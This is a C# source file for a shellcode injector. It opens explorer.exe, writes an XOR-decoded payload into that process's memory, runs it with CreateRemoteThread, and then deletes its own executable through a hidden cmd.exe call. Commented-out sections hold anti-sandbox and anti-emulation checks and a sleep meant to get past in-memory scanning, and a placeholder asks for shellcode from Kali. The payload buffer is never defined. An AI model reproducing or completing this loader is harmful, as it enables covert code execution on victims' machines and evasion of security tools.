using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace inject
{
    internal class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            //if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            //{
            //    return;
            //}

            //IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            //if (ptrCheck == null)
            //{
            //    return;
            //}



            // uncomment the following code if the sand box has internet

            //string exename = "Injector+heuristics";
            //if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            //{
            //    return;
            //}

            //if (Environment.MachineName != "EC2AMAZ-CRPLELS")
            //{
            //    return;
            //}

            //try
            //{
            //    HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://bossjdjiwn.com/");
            //    HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            //
            //   if (res.StatusCode == HttpStatusCode.OK)
            //   {
            //        return;
            //    }
            //}
            //catch (WebException we)
            //{
            //    Console.WriteLine("\r\nWebException Raised. The following error occured : {0}", we.Status);
            //}


            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            //Sleep(dream);
            //if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            //{
            //    Console.WriteLine("Joker, get the rifle out. We're being fucked.");
            //    return;
            //}

            Process[] pList = Process.GetProcessesByName("explorer");
            if (pList.Length == 0)
            {
                // Console.WriteLine("[-] No such process!");
                System.Environment.Exit(1);
            }
            int processId = pList[0].Id;
            // 0x001F0FFF = PROCESS_ALL_ACCESS
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // By zebbern SHELLCODE PAYLOAD HERE CHOOSE FROM ABOVE THIS TEXT PUT IT IN KALI PASTE THE SCRIPT

            // XOR-decrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'j');
            }

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // Launch a separate process to delete the executable
            string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + currentExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

        }
    }
}
